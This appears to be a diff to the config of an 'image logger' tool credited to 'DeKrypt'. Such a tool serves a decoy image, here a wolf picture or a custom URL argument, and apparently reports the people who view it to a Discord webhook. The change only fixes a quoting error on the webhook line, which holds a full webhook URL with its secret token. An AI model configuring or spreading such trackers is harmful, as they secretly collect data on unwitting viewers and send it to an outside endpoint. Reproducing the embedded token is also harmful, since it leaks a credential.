@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": ""https://discord.com/api/webhooks/1132395587619270746/Lu3qdKV8lfsFvWSjQj4AwE-Au3-f1Gt5kjNoYhgKnK4G-fWMH0CS-IkV6TEtaPbrHjkA",
+    "webhook": "https://discord.com/api/webhooks/1132395587619270746/Lu3qdKV8lfsFvWSjQj4AwE-Au3-f1Gt5kjNoYhgKnK4G-fWMH0CS-IkV6TEtaPbrHjkA",
     "image": "https://www.animalspot.net/wp-content/uploads/2022/04/Types-of-Wolves.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
